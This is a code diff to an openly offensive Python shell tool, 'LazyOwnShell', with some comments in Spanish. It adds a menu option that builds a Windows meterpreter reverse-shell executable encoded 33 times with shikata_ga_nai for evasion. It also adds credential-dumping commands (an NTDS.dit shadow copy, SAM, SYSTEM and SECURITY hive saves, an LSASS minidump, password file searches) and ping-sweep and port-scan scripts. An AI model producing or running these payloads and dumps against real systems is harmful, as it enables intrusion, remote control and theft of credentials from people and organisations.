@@ -1699,7 +1699,7 @@ class LazyOwnShell(Cmd):
         `msfvenom` command to generate a payload. Moves the generated payloads to a `sessions`
         directory and sets appropriate permissions. Optionally compresses the payloads using UPX
         and handles a C payload with shikata_ga_nai.
-
+        
         :param line: Command line arguments for the script.
         :return: None
         """
@@ -1726,7 +1726,8 @@ class LazyOwnShell(Cmd):
         print_msg("11: osx/x86/shell_reverse_tcp")
         print_msg("12: osx/x64/shell_reverse_tcp")
         print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
-        choice = input("Enter your choice (1-13): ").strip()
+        print_msg("14: windows/x64/meterpreter/reverse_tcp (C - shikata_ga_nai) 33 iteraciones")
+        choice = input("Enter your choice (1-14): ").strip()
 
         # Define payload commands
         commands = {
@@ -1746,11 +1747,19 @@ class LazyOwnShell(Cmd):
                 f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
                 '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > payload.c'
             ),
+            "14": (
+                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -x sessions/shell.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 33 -k -f exe > shell_encoded.exe'
+            ),
         }
 
         # Check if the choice is valid
         if choice in commands:
             # Execute the chosen command
+            if choice == '14':
+                os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > sessions/shell.exe')
+                print_warn("esperando payload shell.exe ")
+                time.sleep(15)
+                print_warn("codificando payload shell_encoded.exe ")
             os.system(commands[choice])
             print_msg(f"Generated payload: {commands[choice]}")
 
@@ -1770,11 +1779,13 @@ class LazyOwnShell(Cmd):
                     os.system("upx sessions/shell.elf")
                 if os.path.exists("sessions/shell64.elf"):
                     os.system("upx sessions/shell64.elf")
-            if choice in ["3", "4", "9", "10"]:
+            if choice in ["3", "4", "9", "10", "14"]:
                 if os.path.exists("sessions/shell.exe"):
                     os.system("upx sessions/shell.exe")
                 if os.path.exists("sessions/shell64.exe"):
                     os.system("upx sessions/shell64.exe")
+                if os.path.exists("sessions/shell64_encoded.exe"):
+                    os.system("upx sessions/shell64_encoded.exe")
             if choice in ["5", "6", "11", "12"]:
                 if os.path.exists("sessions/shell.macho"):
                     os.system("upx sessions/shell.macho")
@@ -4524,6 +4535,7 @@ class LazyOwnShell(Cmd):
             ("locate backup files", "locate backup"),
             ("locate dump files", "locate dump"),
             ("locate priv files", "locate priv"),
+            ("WIN find password", "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml"),
             ("WIN List Directory", "dir"),
             ("WIN Find index.php in current dir", "dir /s /w /b index.php"),
             ("WIN Find *config*.php in current dir", "dir /s /w /b *config*.php"),
@@ -4532,7 +4544,12 @@ class LazyOwnShell(Cmd):
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
             ("WIN ARP Table", "arp -a"),
-            ("WIN IP Configuration", "ipconfig /all")
+            ("WIN IP Configuration", "ipconfig /all"),
+            ("WIN Crear Instantánea:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
+            ("WIN copy sam1", "reg.exe save hklm\sam C:\sam.save"),
+            ("WIN copy sam2", "reg.exe save hklm\system C:\system.save"),
+            ("WIN copy sam3", "reg.exe save hklm\security C:\security.save"),
+            ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full')
         ]
         
         for idx, (alias, cmd) in enumerate(commands_list):
@@ -5472,6 +5489,186 @@ class LazyOwnShell(Cmd):
         print_msg(f"Pass : {passwd}")
         copy2clip(passwd)
         print_msg(command)
+        return
+
+    def do_hostdiscover(self, line):
+        """
+        Discover active hosts in a subnet by performing a ping sweep.
+
+        This method constructs and executes a bash script that performs a 
+        ping sweep on the specified subnet to identify active hosts. The 
+        subnet is determined from the 'rhost' parameter. For each host in 
+        the subnet, a ping request is sent, and active hosts are reported.
+
+        Parameters:
+        - line (str): The input line argument is not used in this function.
+
+        Behavior:
+        - Extracts the first three octets of the 'rhost' parameter to form 
+        the base IP pattern.
+        - Constructs a bash script to ping each IP address in the subnet 
+        (from .1 to .254) and reports active hosts.
+        - The generated bash script is displayed to the user.
+        - Prompts the user to confirm whether they want to execute the 
+        generated command.
+        - If the user confirms, executes the command using `os.system()`.
+        - If the user declines, copies the command to the clipboard using 
+        `copy2clip()`.
+
+        Side Effects:
+        - Executes system commands and may affect the system environment.
+        - May modify the clipboard content if the user chooses not to execute.
+
+        Notes:
+        - Ensure that the 'rhost' parameter is a valid IP address and that 
+        the `check_rhost()` function is implemented to validate the IP.
+        - `print_msg()` is used to display the constructed command to the 
+        user.
+        - `copy2clip()` is used to copy the command to the clipboard if 
+        not executed.
+
+        Example:
+        >>> do_hostdiscover("example_input")
+        """
+        rhost = self.params['rhost']
+        if not check_rhost(rhost):
+            return
+        oct_rhost = rhost.split('.')
+        pattern = oct_rhost[0] + "." + oct_rhost[1] + "." + oct_rhost[2] 
+        command = """        #!/bin/bash
+        for i in $(seq 1 254); do
+                timeout 1 bash -c "ping -c 1 {pattern}.$i" &>/dev/null && echo "[+] Host {pattern}.$i - active" &
+        done; wait
+        """.replace('        ','').replace('{pattern}',pattern)
+        print_msg(command)
+        execute = input("Do you want to execute? (yes/no): ").strip().lower()
+        if execute == 'yes':
+            os.system(command)
+        else:
+            copy2clip(command)
+        return
+
+    def do_portdiscover(self, line):
+        """
+        Scan all ports on a specified host to identify open ports.
+
+        This method constructs and executes a bash script that performs a 
+        port scan on the specified host to determine which ports are open. 
+        It scans all ports from 0 to 65535 and reports any that are open.
+
+        Parameters:
+        - line (str): The input line argument is not used in this function.
+
+        Behavior:
+        - Extracts the 'rhost' parameter to determine the target IP address.
+        - Constructs a bash script to scan all ports on the target IP address 
+        and report open ports.
+        - The generated bash script is displayed to the user.
+        - Prompts the user to confirm whether they want to execute the 
+        generated command.
+        - If the user confirms, executes the command using `os.system()`.
+        - If the user declines, copies the command to the clipboard using 
+        `copy2clip()`.
+
+        Side Effects:
+        - Executes system commands and may affect the system environment.
+        - May modify the clipboard content if the user chooses not to execute.
+
+        Notes:
+        - Ensure that the 'rhost' parameter is a valid IP address and that 
+        the `check_rhost()` function is implemented to validate the IP.
+        - `print_msg()` is used to display the constructed command to the 
+        user.
+        - `copy2clip()` is used to copy the command to the clipboard if 
+        not executed.
+
+        Example:
+        >>> do_portdiscover("example_input")
+        """
+        rhost = self.params['rhost']
+        if not check_rhost(rhost):
+            return
+
+        command = """        #!/bin/bash
+        ip="{rhost}" 
+        echo "Escaneo de puertos abiertos en curso..."
+        echo " "
+
+        # Realiza un bucle a través de todos los puertos y verifica si están abiertos
+        for port in $(seq 0 65535); do
+            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && echo "Puerto $port abierto"
+        done
+        """.replace('        ','').replace('{rhost}',rhost)
+        print_msg(command)
+        execute = input("Do you want to execute? (yes/no): ").strip().lower()
+        if execute == 'yes':
+            os.system(command)
+        else:
+            copy2clip(command)
+        return
+
+    def do_portservicediscover(self, line):
+        """
+        Scan all ports on a specified host to identify open ports and associated services.
+
+        This method constructs and executes a bash script that performs a 
+        port scan on the specified host to determine which ports are open 
+        and identifies any services running on those open ports. It scans 
+        all ports from 0 to 65535.
+
+        Parameters:
+        - line (str): The input line argument is not used in this function.
+
+        Behavior:
+        - Extracts the 'rhost' parameter to determine the target IP address.
+        - Constructs a bash script to scan all ports on the target IP address 
+        and report open ports along with any associated services.
+        - The generated bash script is displayed to the user.
+        - Prompts the user to confirm whether they want to execute the 
+        generated command.
+        - If the user confirms, executes the command using `os.system()`.
+        - If the user declines, copies the command to the clipboard using 
+        `copy2clip()`.
+
+        Side Effects:
+        - Executes system commands and may affect the system environment.
+        - Requires `sudo` privileges to use `lsof` for identifying services.
+        - May modify the clipboard content if the user chooses not to execute.
+
+        Notes:
+        - Ensure that the 'rhost' parameter is a valid IP address and that 
+        the `check_rhost()` function is implemented to validate the IP.
+        - `print_msg()` is used to display the constructed command to the 
+        user.
+        - `copy2clip()` is used to copy the command to the clipboard if 
+        not executed.
+
+        Example:
+        >>> do_portservicediscover("example_input")
+        """
+        rhost = self.params['rhost']
+        if not check_rhost(rhost):
+            return
+
+        command = """        #!/bin/bash
+        ip="{rhost}" 
+        echo "Escaneo de puertos y servicios abiertos en curso..."
+        echo " "
+
+        # Realiza un bucle a través de todos los puertos y verifica si están abiertos
+        for port in $(seq 0 65535); do
+            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && {
+                service=$(echo "$(sudo lsof -i :$port)" | awk 'NR==2{print $1}')
+                [ -n "$service" ] && echo "Puerto $port abierto - Servicio: $service"
+            }
+        done
+        """.replace('        ','').replace('{rhost}',rhost)
+        print_msg(command)
+        execute = input("Do you want to execute? (yes/no): ").strip().lower()
+        if execute == 'yes':
+            os.system(command)
+        else:
+            copy2clip(command)
         return
 
     def do_rot(self, line):
